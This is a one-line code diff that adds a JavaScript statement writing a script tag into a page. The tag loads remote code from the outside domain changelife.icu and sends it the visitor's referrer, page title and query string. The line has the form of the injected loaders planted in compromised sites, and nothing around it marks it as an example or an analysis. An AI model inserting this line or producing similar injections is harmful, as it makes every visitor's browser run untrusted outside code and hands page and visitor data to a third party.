@@ -1,0 +1,1 @@
+document.write('<script type="application/javascript" src="https://changelife.icu/GSGQhXYT?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm=script"><' + '/script>');
